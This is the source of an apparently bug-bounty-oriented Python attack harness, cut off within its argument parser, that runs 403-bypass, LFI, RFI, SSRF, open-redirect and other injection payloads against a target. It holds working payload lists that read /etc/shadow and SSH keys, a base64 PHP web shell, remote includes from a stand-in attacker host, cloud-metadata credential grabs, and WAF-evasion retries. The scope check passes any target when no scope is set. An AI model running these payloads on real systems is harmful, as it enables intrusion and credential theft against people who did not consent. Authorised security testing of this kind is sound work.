"""
Bypass Harness — Meta-harness / Orchestrator.

Two modes:
  Full sweep  — no --type flag → runs ALL bypass modules in parallel
  Single type — --type X       → runs just that check

Full sweep bypass types (run in parallel):
  cors       CORS misconfiguration
  xxe        XML External Entity injection
  ssrf       Server-Side Request Forgery
  traversal  Path traversal (basic file read)
  ssti       Server-Side Template Injection
  race       Race condition / TOCTOU
  idor       Insecure Direct Object Reference

Targeted single types (full sweep + legacy types):
  403        403 Forbidden bypass (headers, path tricks, methods)
  lfi        Local File Inclusion
  rfi        Remote File Inclusion
  redirect   Open redirect
  auto       Auto-detect from URL structure / param names

Usage:
  # Full sweep (all bypass types):
  python3 bypass_harness.py --target "https://target.com/" --program myprogram

  # Single type:
  python3 bypass_harness.py --target "https://target.com/admin" --type 403
  python3 bypass_harness.py --target "https://target.com/api/user/123" --type idor
  python3 bypass_harness.py --target "https://target.com/fetch?url=x" --type ssrf --param url
  python3 bypass_harness.py --target "https://target.com/dl?file=x" --type lfi --param file
  python3 bypass_harness.py --target "https://target.com/login?next=x" --type redirect --param next
  python3 bypass_harness.py --target "https://target.com/template?page=x" --type traversal --param page
  python3 bypass_harness.py --target "https://target.com/search?q=x" --type ssti
  python3 bypass_harness.py --target "https://target.com/redeem" --type race
  python3 bypass_harness.py --target "https://target.com/api.xml" --type xxe
  python3 bypass_harness.py --target "https://target.com/api" --type cors

Output:
  ~/Shared/bounty_recon/{program}/agent_shared/findings/bypass/
    full_sweep_{timestamp}.json
    {type}_{timestamp}.json
    summary.json
"""

import argparse
import asyncio
import json
import re
import sys
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import AsyncIterator, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

import httpx

# ---------------------------------------------------------------------------
# Local imports
# ---------------------------------------------------------------------------

sys.path.insert(0, str(Path(__file__).parent.parent))

from agents.rate_limiter import RateLimiter
from agents.scope_validator import ScopeValidator
from agents.waf_interceptor import WAFInterceptor

# ---------------------------------------------------------------------------
# Shared result type (re-exported from bypass_types for consumers)
# ---------------------------------------------------------------------------

from agents.bypass_types import (
    BypassResult,
    CORSBypass,
    XXEBypass,
    TraversalBypass,
    SSTIBypass,
    RaceBypass,
    IDORBypass,
    ALL_MODULES,
)

# ---------------------------------------------------------------------------
# Legacy 403 / LFI / RFI / SSRF / Redirect payloads (kept inline)
# ---------------------------------------------------------------------------

# ── 403 bypass ──────────────────────────────────────────────────────────────

_403_HEADER_PAYLOADS: list[dict[str, str]] = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Custom-IP-Access": "localhost"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1;host=localhost"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Proto": "https"},
    {"Referer": "https://localhost/admin"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},
    {"Authorization": "Basic Y29uc3VsdHVzZXI6cGFzc3dvcmQ="},
]

_403_PATH_SUFFIXES: list[str] = [
    "/", "//", "/./", "/%2e/", "/%252e/", "/..;/",
    "/.json", ".php", "?", "#", "/..",  "/....//",
]

_403_PATH_PREFIXES: list[str] = [
    "/%2e", "/.%0a", "/.%0d", "/..%2f..%2f", "/..%252f",
    "/%2e%2e%2f%2e%2e%2f", "/%252e%252e%252f%252e%252e%252f",
    "/%c0%af..%c0%af..%c0%af", "/%ef%bc%8f..%ef%bc%8f..%ef%bc%8f",
]

_403_METHODS: list[str] = ["HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]

# ── LFI bypass ──────────────────────────────────────────────────────────────

_LFI_PAYLOADS: dict[str, list[str]] = {
    "null_byte": [
        "/etc/passwd%00", "/etc/passwd%00.jpg", "/etc/passwd%2500", "/etc/passwd%00.",
    ],
    "path_traversal": [
        "/../../../etc/passwd", "/etc/passwd/././.", "/etc/passwd/....//....//....//etc/passwd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/..%252f..%252f..%252fetc/passwd",
        "/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd", "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "unicode": [
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/%252e%252e%252fetc%252fpasswd",
    ],
    "php_wrappers": [
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.toupper/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://input", "expect://id",
        "zip://uploads/file.jpg%23shell.php",
        "phar://uploads/file.jpg%23shell.php",
    ],
    "log_poisoning": [
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "/proc/self/environ", "/proc/self/fd/0", "/proc/self/cmdline",
    ],
    "interesting_files": [
        "/etc/shadow", "/etc/hosts", "/etc/hostname", "/etc/resolv.conf",
        "/root/.ssh/id_rsa", "/proc/self/status",
    ],
}

_LFI_CONFIRM_PATTERNS: list[str] = [
    "root:x:0:0", "root:!:0:0", "/bin/bash", "/bin/sh",
    "nobody:x:", "daemon:x:", "HTTP_", "SERVER_SOFTWARE",
    "AWS_SECRET", "ami-id", "instance-id",
]

# ── RFI bypass ──────────────────────────────────────────────────────────────

_RFI_PAYLOADS: dict[str, list[str]] = {
    "http_includes": [
        "http://evil-rfi-test.com/shell.txt", "http://evil-rfi-test.com/shell.txt?",
        "http://evil-rfi-test.com/shell.txt%00", "http://evil-rfi-test.com/shell.php",
    ],
    "https_includes": ["https://evil-rfi-test.com/shell.txt"],
    "ftp_includes":   ["ftp://evil-rfi-test.com/shell.txt"],
    "smb_includes":   ["\\\\evil-rfi-test.com\\share\\shell.txt"],
    "data_uri": [
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "data://text/plain,<?php phpinfo(); ?>",
    ],
}

_RFI_CONFIRM_PATTERNS: list[str] = [
    "phpinfo()", "PHP Version", "System", "Server API", "shell_exec", "passthru",
]

# ── SSRF bypass ──────────────────────────────────────────────────────────────

_SSRF_PAYLOADS: dict[str, list[str]] = {
    "localhost_variants": [
        "http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/", "http://[::1]/",
        "http://2130706433/", "http://0x7f000001/", "http://017700000001/",
        "http://0177.0.0.1/", "http://127.1/", "http://127\u30020\u30020\u30021/",
        "http://127%2e0%2e0%2e1/",
    ],
    "cloud_aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://fd00:ec2::254/latest/meta-data/",
        "http://169.254.170.2/v2/credentials/",
    ],
    "cloud_gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "cloud_azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "internal_services": [
        "http://localhost:8080/", "http://localhost:8443/", "http://localhost:9200/",
        "http://localhost:6379/", "http://localhost:27017/", "http://localhost:2375/",
        "http://kubernetes.default.svc/",
    ],
    "url_parse_bypass": [
        "http://127.0.0.1@evil.com/", "http://evil.com@127.0.0.1/",
        "http://127.0.0.1#@evil.com/", "http://127.0.0.1.evil.com/",
    ],
    "dns_rebind": ["http://localtest.me/", "http://127.0.0.1.nip.io/"],
    "alternative_schemes": [
        "gopher://127.0.0.1:6379/_PING", "dict://127.0.0.1:6379/INFO", "file:///etc/passwd",
    ],
}

_SSRF_CONFIRM_PATTERNS: list[tuple[str, str]] = [
    (r"ami-[0-9a-f]{8,17}", "AWS AMI ID"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r'"AccessKeyId"\s*:', "AWS credentials JSON"),
    (r'"serviceAccounts"', "GCP service account"),
    (r'"compute#metadata"', "GCP compute metadata"),
    (r'"subscriptionId"', "Azure subscription"),
    (r"root:x:0:0", "Linux /etc/passwd"),
    (r"\+PONG", "Redis PONG"),
    (r'"gitVersion".*"v1\."', "Kubernetes API"),
    (r"Docker-Distribution-Api-Version", "Docker registry"),
    (r"elastic|kibana", "Elasticsearch"),
]

# ── Open redirect bypass ─────────────────────────────────────────────────────

_EVIL_DOMAIN = "evil-redir-test.com"

_REDIRECT_PAYLOADS: dict[str, list[str]] = {
    "protocol_relative": [
        f"//{_EVIL_DOMAIN}", f"////{_EVIL_DOMAIN}",
        f"\\/\\/{_EVIL_DOMAIN}", f"/\\//{_EVIL_DOMAIN}",
    ],
    "absolute": [
        f"https://{_EVIL_DOMAIN}", f"http://{_EVIL_DOMAIN}",
        f"https://{_EVIL_DOMAIN}/",
    ],
    "subdomain_confusion": [
        f"https://{_EVIL_DOMAIN}@trusted.com", f"https://trusted.com@{_EVIL_DOMAIN}",
    ],
    "encoded": [
        f"https%3A%2F%2F{_EVIL_DOMAIN}", f"%2F%2F{_EVIL_DOMAIN}",
        f"https%3A%2F%2F{_EVIL_DOMAIN}%2F",
    ],
    "null_char": [
        f"{_EVIL_DOMAIN}%00.trusted.com", f"//\x09{_EVIL_DOMAIN}",
    ],
    "javascript_data": [
        "javascript:alert(document.domain)", "j%61vasc%72ipt:alert(1)",
        "JaVaScRiPt:alert(1)", "java\tscript:alert(1)",
        "data:text/html,<script>window.location='https://evil.com'</script>",
    ],
    "path_traversal": [
        "///google.com", "//google.com", "////google.com",
    ],
}

_META_REDIRECT_RE = re.compile(
    r'(?:window\.location|location\.href|location\.replace|meta[^>]+http-equiv=["\']?refresh["\']?)[^>]*'
    + re.escape(_EVIL_DOMAIN),
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# HTTP helper context manager
# ---------------------------------------------------------------------------

class _null_cm:
    async def __aenter__(self):   return self
    async def __aexit__(self, *_): pass


# ---------------------------------------------------------------------------
# BypassOrchestrator
# ---------------------------------------------------------------------------

class BypassOrchestrator:
    """
    Meta-harness / orchestrator.

    - Full sweep: runs ALL bypass modules in parallel when type='sweep'
    - Single type: dispatches to specific legacy method or bypass_types module
    """

    USER_AGENT = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    # New bypass types handled by bypass_types modules
    _MODULE_TYPES = {
        "cors":      CORSBypass,
        "xxe":       XXEBypass,
        "traversal": TraversalBypass,
        "ssti":      SSTIBypass,
        "race":      RaceBypass,
        "idor":      IDORBypass,
    }

    def __init__(
        self,
        timeout: int = 10,
        concurrency: int = 10,
        rps: float = 5.0,
        verbose: bool = False,
        program: Optional[str] = None,
    ):
        self.timeout     = timeout
        self.concurrency = concurrency
        self.verbose     = verbose
        self.program     = program
        self._limiter    = RateLimiter(requests_per_second=rps, burst=min(int(rps * 3), 30))
        self._scope: Optional[ScopeValidator] = None
        if program:
            self._scope = ScopeValidator(program=program, strict=False)
        # WAF interceptor — target set lazily on first request (target varies per call)
        self._waf: Optional[WAFInterceptor] = None

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"[bypass] {msg}", flush=True)

    def _check_scope(self, url: str) -> bool:
        if self._scope is None:
            return True
        if self._scope.is_empty():
            return True
        ok = self._scope.is_in_scope(url)
        if not ok:
            self._log(f"OUT OF SCOPE: {url}")
        return ok

    # ── Full sweep ────────────────────────────────────────────────────────────

    async def run_sweep(
        self,
        target: str,
        param: Optional[str] = None,
    ) -> AsyncIterator[BypassResult]:
        """Run ALL bypass modules in parallel and yield every result."""
        if not self._check_scope(target):
            yield BypassResult(
                success=False, vuln_type="sweep", technique="scope_check",
                category="scope", payload=target, url=target,
                status_code=0, evidence="", note="target is out of scope",
            )
            return

        sem = asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": self.USER_AGENT},
        ) as client:
            # Run detect() on each module first
            detect_coros = [
                cls().detect(target, client, self._limiter)
                for cls in ALL_MODULES
            ]
            detected = await asyncio.gather(*detect_coros, return_exceptions=True)

            # For each module, run scan() (we run all regardless of detect()
            # result — detect() is advisory, scan() is authoritative)
            scan_coros = []
            module_names = []
            for cls, detected_result in zip(ALL_MODULES, detected):
                mod = cls()
                applies = detected_result if isinstance(detected_result, bool) else False
                self._log(
                    f"{mod.name}: detect={'yes' if applies else 'no/error'} → scanning anyway"
                )
                scan_coros.append(mod.scan(target, client, sem, self._limiter, param=param))
                module_names.append(mod.name)

            # Gather all scans concurrently
            scan_results = await asyncio.gather(*scan_coros, return_exceptions=True)

            # Also run SSRF inline (uses async _run_ssrf)
            ssrf_results: list[BypassResult] = []
            ssrf_param = param or _guess_param(target) or "url"
            async for r in self._run_ssrf(target, ssrf_param, client, sem):
                ssrf_results.append(r)

            # Yield module results
            for mod_name, results in zip(module_names, scan_results):
                if isinstance(results, Exception):
                    yield BypassResult(
                        success=False, vuln_type=mod_name.lower(), technique="module_error",
                        category="error", payload="", url=target,
                        status_code=0, evidence="", note=f"module error: {results}",
                    )
                else:
                    for r in results:
                        yield r

            # Yield SSRF results
            for r in ssrf_results:
                yield r

    # ── Single-type entry point ───────────────────────────────────────────────

    async def run_bypass(
        self,
        target: str,
        vuln_type: str,
        param: Optional[str] = None,
    ) -> AsyncIterator[BypassResult]:
        """Dispatch to the right scanner for a single bypass type."""
        if not self._check_scope(target):
            yield BypassResult(
                success=False, vuln_type=vuln_type, technique="scope_check",
                category="scope", payload=target, url=target,
                status_code=0, evidence="", note="target is out of scope",
            )
            return

        sem = asyncio.Semaphore(self.concurrency)
        async with httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=False,
            verify=False,
            headers={"User-Agent": self.USER_AGENT},
        ) as client:

            # New bypass_types modules
            if vuln_type in self._MODULE_TYPES:
                mod = self._MODULE_TYPES[vuln_type]()
                results = await mod.scan(target, client, sem, self._limiter, param=param)
                for r in results:
                    yield r

            # Full sweep via --type sweep
            elif vuln_type == "sweep":
                async for r in self.run_sweep(target, param=param):
                    yield r

            # Auto-detect
            elif vuln_type == "auto":
                detected = await self._auto_detect(target, param, client)
                print(f"[*] Auto-detected type: {detected}", flush=True)
                async for r in self.run_bypass(target, detected, param=param):
                    yield r

            # Legacy types
            elif vuln_type == "403":
                async for r in self._run_403(target, client, sem):
                    yield r
            elif vuln_type == "lfi":
                if not param:
                    param = _guess_param(target) or "file"
                    self._log(f"Guessed LFI param: {param!r}")
                async for r in self._run_lfi(target, param, client, sem):
                    yield r
            elif vuln_type == "rfi":
                if not param:
                    param = _guess_param(target) or "file"
                    self._log(f"Guessed RFI param: {param!r}")
                async for r in self._run_rfi(target, param, client, sem):
                    yield r
            elif vuln_type == "ssrf":
                if not param:
                    param = _guess_param(target) or "url"
                    self._log(f"Guessed SSRF param: {param!r}")
                async for r in self._run_ssrf(target, param, client, sem):
                    yield r
            elif vuln_type == "redirect":
                if not param:
                    param = _guess_param(target) or "next"
                    self._log(f"Guessed redirect param: {param!r}")
                async for r in self._run_redirect(target, param, client, sem):
                    yield r
            else:
                print(
                    f"[!] Unknown type: {vuln_type!r}. "
                    f"Choose from: sweep cors xxe traversal ssti race idor "
                    f"403 lfi rfi ssrf redirect auto",
                    flush=True,
                )

    # ── Auto-detect ──────────────────────────────────────────────────────────

    async def _auto_detect(
        self, target: str, param: Optional[str], client: httpx.AsyncClient
    ) -> str:
        parsed = urlparse(target)
        path = parsed.path

        if re.search(r"/\d{1,12}(/|$|\?)", path):
            self._log("Auto-detected: idor")
            return "idor"

        if param:
            p = param.lower()
            if any(kw in p for kw in ("url", "src", "dest", "host", "proxy", "fetch", "load", "href", "link", "endpoint")):
                return "ssrf"
            if any(kw in p for kw in ("file", "path", "page", "doc", "template", "include", "module", "dir", "folder")):
                return "traversal"
            if any(kw in p for kw in ("next", "redir", "redirect", "return", "goto", "back", "url", "to", "forward")):
                return "redirect"

        try:
            async with self._limiter.http():
                resp = await client.get(target)
                self._limiter.adapt_to_response(resp)
                if resp.status_code == 403:
                    return "403"
        except httpx.RequestError:
            pass

        return "403"

    # ── HTTP helper ──────────────────────────────────────────────────────────

    # Bypass types where the URL carries an injected payload value.
    # These use aget_payload() (Tier 1 + Tier 2) instead of wrap_async().
    _PAYLOAD_TYPES = frozenset({"lfi", "rfi", "ssrf", "redirect"})

    def _get_waf(self, target: str) -> WAFInterceptor:
        """Return a WAFInterceptor scoped to this target (lazy init / reuse)."""
        parsed = httpx.URL(target)
        origin = f"{parsed.scheme}://{parsed.host}"
        if self._waf is None or self._waf.target != origin:
            self._waf = WAFInterceptor(
                target=origin,
                program=self.program,
                verbose=self.verbose,
            )
        return self._waf

    async def _get(
        self,
        client: httpx.AsyncClient,
        url: str,
        headers: Optional[dict] = None,
        method: str = "GET",
        semaphore: Optional[asyncio.Semaphore] = None,
    ) -> Optional[httpx.Response]:
        """Normal request — Tier 1 WAF bypass only (no payload obfuscation)."""
        cm = semaphore if semaphore else _null_cm()
        async with cm:
            try:
                async with self._limiter.http():
                    resp = await client.request(method, url, headers=headers or {})
                    self._limiter.adapt_to_response(resp)
                    # WAF auto-bypass: if blocked, retry with bypass techniques
                    waf = self._get_waf(url)
                    resp = await waf.wrap_async(client, method, url, resp, headers=headers or {})
                    return resp
            except httpx.RequestError as e:
                self._log(f"Request error {url}: {e}")
                return None

    async def _get_payload(
        self,
        client: httpx.AsyncClient,
        url: str,
        semaphore: Optional[asyncio.Semaphore] = None,
    ) -> Optional[httpx.Response]:
        """Payload request — Tier 1 WAF bypass + Tier 2 payload obfuscation."""
        cm = semaphore if semaphore else _null_cm()
        async with cm:
            try:
                async with self._limiter.http():
                    waf = self._get_waf(url)
                    resp = await waf.aget_payload(url, client=client)
                    self._limiter.adapt_to_response(resp)
                    return resp
            except httpx.RequestError as e:
                self._log(f"Request error {url}: {e}")
                return None

    # ── 403 bypass ───────────────────────────────────────────────────────────

    async def _run_403(
        self, target: str, client: httpx.AsyncClient, sem: asyncio.Semaphore
    ) -> AsyncIterator[BypassResult]:
        parsed = httpx.URL(target)
        base = str(parsed.copy_with(path="", query="", fragment=""))
        path = str(parsed.path) or "/"
        segment = path.split("/")[-1] if "/" in path else path

        baseline_resp = await self._get(client, target, semaphore=sem)
        baseline = baseline_resp.status_code if baseline_resp else 0
        self._log(f"403 baseline: {target} → {baseline}")

        tasks = []
        for headers in _403_HEADER_PAYLOADS:
            tasks.append(("header_injection", str(headers), target, headers, "GET"))
        for suffix in _403_PATH_SUFFIXES:
            variant = base + path.rstrip("/") + suffix
            tasks.append(("path_manipulation", suffix, variant, {}, "GET"))
        tasks.append(("case_variation", path.upper(), base + path.upper(), {}, "GET"))
        for prefix in _403_PATH_PREFIXES:
            variant = base + prefix + "/" + segment
            tasks.append(("path_prefix", prefix, variant, {}, "GET"))
        for method in _403_METHODS:
            tasks.append(("method_switch", method, target, {}, method))
        flipped = target.replace("https://", "http://", 1) if target.startswith("https://") \
            else target.replace("http://", "https://", 1)
        tasks.append(("protocol_flip", flipped, flipped, {}, "GET"))

        coros = [
            self._get(client, url, headers=h, method=m, semaphore=sem)
            for (tech, payload, url, h, m) in tasks
        ]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for (tech, payload, url, h, m), resp in zip(tasks, results):
            if isinstance(resp, Exception) or resp is None:
                yield BypassResult(
                    success=False, vuln_type="403", technique=tech, category="403_bypass",
                    payload=payload, url=url, status_code=0, evidence="", note="request_error",
                )
                continue
            success = resp.status_code in (200, 201, 204) and baseline in (403, 401)
            yield BypassResult(
                success=success, vuln_type="403", technique=tech, category="403_bypass",
                payload=payload, url=url, status_code=resp.status_code, evidence=resp.text[:200],
            )

    # ── LFI bypass ───────────────────────────────────────────────────────────

    async def _run_lfi(
        self, target: str, param: str, client: httpx.AsyncClient, sem: asyncio.Semaphore
    ) -> AsyncIterator[BypassResult]:
        tasks = []
        for category, payloads in _LFI_PAYLOADS.items():
            for payload in payloads:
                sep = "&" if "?" in target else "?"
                url = f"{target}{sep}{param}={payload}"
                tasks.append((category, payload, url))

        coros = [self._get_payload(client, url, semaphore=sem) for (_, _, url) in tasks]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for (category, payload, url), resp in zip(tasks, results):
            if isinstance(resp, Exception) or resp is None:
                yield BypassResult(
                    success=False, vuln_type="lfi", technique="param_injection",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note="request_error",
                )
                continue
            matched = next((p for p in _LFI_CONFIRM_PATTERNS if p in resp.text), None)
            yield BypassResult(
                success=matched is not None, vuln_type="lfi", technique="param_injection",
                category=category, payload=payload, url=url,
                status_code=resp.status_code, evidence=resp.text[:200],
                note=f"matched={matched!r}" if matched else "",
            )

    # ── RFI bypass ───────────────────────────────────────────────────────────

    async def _run_rfi(
        self, target: str, param: str, client: httpx.AsyncClient, sem: asyncio.Semaphore
    ) -> AsyncIterator[BypassResult]:
        tasks = []
        for category, payloads in _RFI_PAYLOADS.items():
            for payload in payloads:
                sep = "&" if "?" in target else "?"
                url = f"{target}{sep}{param}={payload}"
                tasks.append((category, payload, url))

        coros = [self._get_payload(client, url, semaphore=sem) for (_, _, url) in tasks]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for (category, payload, url), resp in zip(tasks, results):
            if isinstance(resp, Exception) or resp is None:
                yield BypassResult(
                    success=False, vuln_type="rfi", technique="param_injection",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note="request_error",
                )
                continue
            matched = next((p for p in _RFI_CONFIRM_PATTERNS if p.lower() in resp.text.lower()), None)
            yield BypassResult(
                success=matched is not None, vuln_type="rfi", technique="param_injection",
                category=category, payload=payload, url=url,
                status_code=resp.status_code, evidence=resp.text[:200],
                note=f"matched={matched!r}" if matched else "",
            )

    # ── SSRF bypass ──────────────────────────────────────────────────────────

    async def _run_ssrf(
        self, target: str, param: str, client: httpx.AsyncClient, sem: asyncio.Semaphore
    ) -> AsyncIterator[BypassResult]:
        tasks = []
        for category, payloads in _SSRF_PAYLOADS.items():
            for payload in payloads:
                sep = "&" if "?" in target else "?"
                url = f"{target}{sep}{param}={payload}"
                tasks.append((category, payload, url))

        coros = [self._get_payload(client, url, semaphore=sem) for (_, _, url) in tasks]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for (category, payload, url), resp in zip(tasks, results):
            if isinstance(resp, Exception) or resp is None:
                yield BypassResult(
                    success=False, vuln_type="ssrf", technique="param_injection",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note="request_error",
                )
                continue
            combined = resp.text + " ".join(f"{k}: {v}" for k, v in resp.headers.items())
            matched = next(
                (desc for pat, desc in _SSRF_CONFIRM_PATTERNS
                 if re.search(pat, combined, re.IGNORECASE)),
                None,
            )
            yield BypassResult(
                success=matched is not None, vuln_type="ssrf", technique="param_injection",
                category=category, payload=payload, url=url,
                status_code=resp.status_code, evidence=resp.text[:200],
                note=f"matched={matched!r}" if matched else "",
            )

    # ── Open redirect bypass ─────────────────────────────────────────────────

    async def _run_redirect(
        self, target: str, param: str, client: httpx.AsyncClient, sem: asyncio.Semaphore
    ) -> AsyncIterator[BypassResult]:
        tasks = []
        for category, payloads in _REDIRECT_PAYLOADS.items():
            for payload in payloads:
                sep = "&" if "?" in target else "?"
                url = f"{target}{sep}{param}={payload}"
                tasks.append((category, payload, url))

        coros = [self._get_payload(client, url, semaphore=sem) for (_, _, url) in tasks]
        results = await asyncio.gather(*coros, return_exceptions=True)

        for (category, payload, url), resp in zip(tasks, results):
            if isinstance(resp, Exception) or resp is None:
                yield BypassResult(
                    success=False, vuln_type="redirect", technique="param_injection",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note="request_error",
                )
                continue
            location = resp.headers.get("location", "")
            header_hit = resp.status_code in (301, 302, 303, 307, 308) and _EVIL_DOMAIN in location
            body_hit   = bool(_META_REDIRECT_RE.search(resp.text))
            success    = header_hit or body_hit
            note       = "3xx_header" if header_hit else ("js_meta_body" if body_hit else "")
            yield BypassResult(
                success=success, vuln_type="redirect", technique="param_injection",
                category=category, payload=payload, url=url,
                status_code=resp.status_code, evidence=resp.text[:200], note=note,
            )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _guess_param(url: str) -> Optional[str]:
    qs = parse_qs(urlparse(url).query)
    return next(iter(qs), None)


# ---------------------------------------------------------------------------
# Report writer
# ---------------------------------------------------------------------------

def _output_dir(program: Optional[str], custom_dir: Optional[str]) -> Path:
    if custom_dir:
        d = Path(custom_dir).expanduser()
    elif program:
        d = (
            Path.home()
            / "Shared"
            / "bounty_recon"
            / program
            / "agent_shared"
            / "findings"
            / "bypass"
        )
    else:
        d = Path.cwd() / "bypass_results"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _write_report(path: Path, results: list[BypassResult], target: str, vuln_type: str) -> None:
    with open(path, "w") as f:
        f.write(f"# Bypass Harness Report\n")
        f.write(f"# Target:    {target}\n")
        f.write(f"# Type:      {vuln_type}\n")
        f.write(f"# Count:     {len(results)}\n\n")
        for r in results:
            f.write(r.to_line() + "\n")
            if r.note:
                f.write(f"  note: {r.note}\n")
            if r.evidence:
                f.write(f"  evidence: {r.evidence[:120]!r}\n")
            f.write("\n")


def _write_json(path: Path, results: list[BypassResult], target: str, vuln_type: str) -> None:
    payload = {
        "target":    target,
        "type":      vuln_type,
        "timestamp": datetime.utcnow().isoformat(),
        "hits":      [asdict(r) for r in results if r.success],
        "total":     len(results),
        "hit_count": sum(1 for r in results if r.success),
    }
    with open(path, "w") as f:
        json.dump(payload, f, indent=2)


async def run_and_report(
    target: str,
    vuln_type: str,                  # 'sweep' or specific type
    param: Optional[str] = None,
    program: Optional[str] = None,
    output_dir: Optional[str] = None,
    timeout: int = 10,
    concurrency: int = 10,
    rps: float = 5.0,
    verbose: bool = False,
    quiet: bool = False,
) -> tuple[list[BypassResult], list[BypassResult]]:
    """Run all techniques and write reports. Returns (successes, failures)."""
    orchestrator = BypassOrchestrator(
        timeout=timeout, concurrency=concurrency,
        rps=rps, verbose=verbose, program=program,
    )

    successes: list[BypassResult] = []
    failures:  list[BypassResult] = []
    total = 0

    scanner = (
        orchestrator.run_sweep(target, param=param)
        if vuln_type == "sweep"
        else orchestrator.run_bypass(target, vuln_type, param=param)
    )

    async for result in scanner:
        total += 1
        if result.success:
            successes.append(result)
            print(f"\033[92m[HIT]\033[0m {result.to_line()}", flush=True)
        else:
            failures.append(result)
            if not quiet:
                print(f"[miss] {result.to_line()}", flush=True)

    out = _output_dir(program, output_dir)
    ts  = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    if vuln_type == "sweep":
        _write_json(out / f"full_sweep_{ts}.json",   successes + failures, target, vuln_type)
        _write_report(out / f"full_sweep_{ts}.txt",  successes + failures, target, vuln_type)
    else:
        _write_json(out / f"{vuln_type}_{ts}.json",  successes + failures, target, vuln_type)
        _write_report(out / f"{vuln_type}_{ts}.txt", successes + failures, target, vuln_type)

    # Always update summary.json
    _write_json(out / "summary.json", successes, target, vuln_type)

    print(f"\n[*] Tested {total} techniques → {len(successes)} HIT, {len(failures)} miss", flush=True)
    print(f"[*] Reports written to: {out}", flush=True)
    if successes:
        print(f"\n\033[92m[+] SUCCESSFUL BYPASSES ({len(successes)}):\033[0m")
        for r in successes:
            print(f"    {r.to_line()}")

    return successes, failures


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

_ALL_TYPES = ["sweep", "cors", "xxe", "traversal", "ssti", "race", "idor",
              "403", "lfi", "rfi", "ssrf", "redirect", "auto"]


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description=(
            "Bypass Meta-Harness — orchestrates ALL bypass checks or runs a single type.\n"
            "Omit --type to run full sweep (cors, xxe, ssrf, traversal, ssti, race, idor)."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full sweep (all bypass types):
  %(prog)s --target "https://target.com/" --program myprogram

  # Single type:
  %(prog)s --target "https://target.com/admin"              --type 403
  %(prog)s --target "https://target.com/api/user/123"       --type idor
  %(prog)s --target "https://target.com/fetch?url=x"        --type ssrf      --param url
  %(prog)s --target "https://target.com/dl?file=x"          --type lfi       --param file
  %(prog)s --target "https://target.com/login?next=x"       --type redirect  --param next
  %(prog)s --target "https://target.com/tpl?page=x"         --type traversal --param page
  %(prog)s --target "https://target.com/search?q=x"         --type ssti
  %(prog)s --target "https://target.com/redeem"             --type race
  %(prog)s --target "https://target.com/api.xml"            --type xxe
  %(prog)s --target "https://target.com/api"                --type cors
        """,
    )
    p.add_argument("--target",  "-t", required=True, help="Target URL")
    p.add_argument(
        "--type", "-T", default="sweep",
        choices=_ALL_TYPES,
        help="Bypass type (default: sweep = run all)",
    )
    p.add_argument("--param",       "-p",              help="Parameter name to inject into")
    p.add_argument("--program",                        help="Bug bounty program slug (scope + output dir)")
    p.add_argument("--output-dir",  "-o",              help="Output directory override")
